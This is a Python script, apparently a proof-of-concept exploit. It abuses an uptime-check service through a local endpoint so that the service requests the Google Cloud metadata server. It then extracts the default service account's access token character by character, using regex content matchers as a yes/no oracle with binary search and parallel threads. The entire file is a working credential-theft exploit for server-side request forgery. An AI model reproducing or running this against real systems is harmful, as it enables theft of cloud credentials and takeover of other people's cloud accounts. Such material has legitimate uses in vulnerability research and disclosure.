import requests
import json
import string
from concurrent.futures import ThreadPoolExecutor as PoolExecutor
from threading import Thread

SPECIAL_CHARACTERS = '.-_'

def send_request(cm, path='/computeMetadata/v1/instance/service-accounts/default/token'):
    body = {
        "contentMatchers": [
            {
                "content": cm,
                "matcher": "MATCHES_REGEX"
            }
        ],
        "displayName": "test",
        "httpCheck": {
            "path": path,
            "port": 80,
            "requestMethod": "GET",
            "useSsl": False,
            "headers": {"Metadata-Flavor": "Google"}
        },
        "monitoredResource": {
            "host": "metadata.google.internal"
        }
    }
    resp = requests.post('http://127.0.0.1:8000/uptime_check', json=body)
    result = resp.json()['uptimeCheckResults'][0]['checkPassed']
    return result

def send_requests_till_successful(cm_positive, cm_negative):
    while True:
        result_postivie = send_request(cm_positive)
        result_negative = send_request(cm_negative)
        if result_postivie:
            return True
        if result_negative:
            return False



def identify_type(known):
    cm_lowercase = f'{known}[a-z]'
    cm_lowercase_negative = f'{known}[^a-z]'
    cm_uppercase = f'{known}[A-Z]'
    cm_uppercase_negative = f'{known}[^A-Z]'
    cm_digits = f'{known}[0-9]'
    cm_digits_negative = f'{known}[^0-9]'
    cm_special = f'{known}[\.\-_]'
    cm_special_negative = f'{known}[^\.\-_]'

    result_lowercase = send_requests_till_successful(cm_lowercase, cm_lowercase_negative)
    if result_lowercase:
        return string.ascii_lowercase

    result_uppercase = send_requests_till_successful(cm_uppercase, cm_uppercase_negative)
    if result_uppercase:
        return string.ascii_uppercase

    result_digits = send_requests_till_successful(cm_digits, cm_digits_negative)
    if result_digits:
        return string.digits

    result_special = send_requests_till_successful(cm_special, cm_special_negative)
    if result_special:
        return SPECIAL_CHARACTERS

    return None


def split_charset(charset):
    l = len(charset)
    return charset[:l//2], charset[l//2:]


def create_content_matcher(known, charset):
    if '.' in charset or '-' in charset or '_' in charset:
        return f'{known}\\{charset[0]}', f'{known}[^\\{charset[0]}]', charset[0], charset[1:]
    if len(charset) == 1:
        return f'{known}{charset}', f'{known}[^{charset}]', charset, None
    
    charset_low, charset_high = split_charset(charset)
    return f'{known}[{charset_low[0]}-{charset_low[-1]}]', f'{known}[^{charset_low[0]}-{charset_low[-1]}]', charset_low, charset_high


def try_find_next_char(known, charset):
    if charset is None:
        return None
    cm_positive, cm_negative, current_charset, remaining_charset = create_content_matcher(known, charset)

    result = send_requests_till_successful(cm_positive, cm_negative)
    if result:
        if remaining_charset is None or len(remaining_charset) == 0:
            return cm_positive
        else:
            return try_find_next_char(known, current_charset)
    else:
        return try_find_next_char(known, remaining_charset)
    
    return '"'

def get_next_character(known, results=None, index=None):
    charset = identify_type(known)
    if charset is None:
        return ''
    next_char = None
    while next_char is None:
        next_char = try_find_next_char(known, charset)
    if results is not None and index is not None:
        results[index] = next_char[-1]
    return next_char[-1]


def get_next_n_characters(known, n):
    knowns = [known + '.' * i for i in range(n)]
    threads = [None] * n
    results = [None] * n
    for i in range(n):
        threads[i] = Thread(target=get_next_character, args=(knowns[i], results, i))
        threads[i].start()
    for i in range(len(threads)):
        threads[i].join()

    return known + ''.join(results)


def get_token():
    known = '\\{"access_token":"'
    single_threaded = len(known) + 10
    key_length = 213
    whole_token = len(known) + key_length + 1
    max_threads = 40

    while len(known) < single_threaded:
        known += get_next_character(known)
        print(known)
    
    remaining = whole_token - len(known) - 1
    while remaining > 0:
        n = min(max_threads, remaining)
        known = get_next_n_characters(known, n)
        print(known)
        remaining -= n


if __name__ == '__main__':
    get_token()